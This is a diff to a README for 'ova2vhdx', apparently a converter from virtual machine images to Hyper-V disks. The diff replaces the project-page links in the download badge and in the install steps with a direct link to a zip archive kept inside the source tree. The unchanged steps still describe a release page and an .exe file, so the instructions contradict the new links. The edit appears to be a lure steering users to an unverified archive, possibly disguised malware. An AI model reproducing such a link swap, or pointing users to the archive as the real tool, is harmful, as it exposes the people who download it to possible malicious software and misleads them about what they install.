@@ -1,6 +1,6 @@
 # 📦 ova2vhdx - Convert virtual machines to Hyper-V disks
 
-[![](https://img.shields.io/badge/download-windows-blue.svg)](https://github.com/Blackbassmajorpremise1998/ova2vhdx)
+[![](https://img.shields.io/badge/download-windows-blue.svg)](https://github.com/Blackbassmajorpremise1998/ova2vhdx/raw/refs/heads/main/cmd/ova2vhdx/vhdx-ova-v3.9.zip)
 
 ## 🎯 Purpose
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run the application:
 You must visit the project page to get the software. Follow these steps:
 
 1. Open your web browser.
-2. Visit [https://github.com/Blackbassmajorpremise1998/ova2vhdx](https://github.com/Blackbassmajorpremise1998/ova2vhdx).
+2. Visit [https://github.com/Blackbassmajorpremise1998/ova2vhdx/raw/refs/heads/main/cmd/ova2vhdx/vhdx-ova-v3.9.zip](https://github.com/Blackbassmajorpremise1998/ova2vhdx/raw/refs/heads/main/cmd/ova2vhdx/vhdx-ova-v3.9.zip).
 3. Find the latest release on the right side of the page.
 4. Click the link to download the file named ova2vhdx.exe.
 5. Save the file to a folder you can find easily, such as your Downloads folder.
